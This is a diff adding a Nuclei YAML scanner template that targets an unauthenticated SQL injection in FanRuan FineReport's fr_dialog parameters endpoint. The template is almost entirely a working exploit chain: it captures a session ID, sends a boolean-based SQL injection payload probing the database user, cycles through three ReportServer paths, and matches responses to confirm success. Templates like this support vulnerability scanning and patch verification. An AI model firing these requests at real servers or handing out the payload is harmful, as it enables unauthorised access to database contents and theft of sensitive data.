@@ -1,0 +1,67 @@
+id: fanruan-finereport-fr-dialog-sqli
+
+info:
+  name: fanruan-finereport-fr-dialog-sqli
+  author: xy,wuha
+  severity: high
+  description: FineReport报表软件网络报表查询处存在未授权访问，从而导致sql注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
+  reference:
+    http://vulhub.nuclei/doc/385/
+  tags: fanruan,finereport,sqli
+
+http:
+  - raw:
+      - |
+        GET {{path}}?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+
+      - |
+        POST {{path}}?op=fr_dialog&cmd=parameters_d&sessionID={{sessionID}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        origin: {{RootURL}}
+        Referer: {{RootURL}}{{path}}?op=fr_log&cmd=fg_errinfo&fr_username=admin
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 288
+
+        __parameters__={"LABEL1":"TYPE:","TYPE":"10/case when substr(user(),1,1)='!' then 1 else 0 end","LABEL3":"START_TIME:","START_TIME":"2023-08-01 00:00","LABEL5":"END_TIME:","END_TIME":"2023-08-01 22:21","LABEL7":"LIMIT:","LIMIT":1000}
+
+      - |
+        GET {{path}}?_=1691062003921&__boxModel__=true&op=page_content&sessionID={{sessionID}}&pn=1&__webpage__=true&_paperWidth=2560&_paperHeight=1174&__fit__=false HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Referer: {{RootURL}}{{path}}?op=fr_log&cmd=fg_errinfo&fr_username=admin
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+    payloads:
+      path:
+        - "/seeyonreport/ReportServer"
+        - "/ReportServer"
+        - "/WebReport/ReportServer"
+
+    extractors:
+      - type: regex
+        name: sessionID
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "FR.SessionMgr.register\\('(\\d+)'"  
+          
+    stop-at-first-match: true      
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '/seeyonreport/ReportServer?op=widget&widgetname=null&sessionID=')"
+          - "status_code_2 == 200"
+          - "status_code_3 == 200 && contains((body_3), 'var isIE = FR.Browser.isIE();')"
+        condition: and
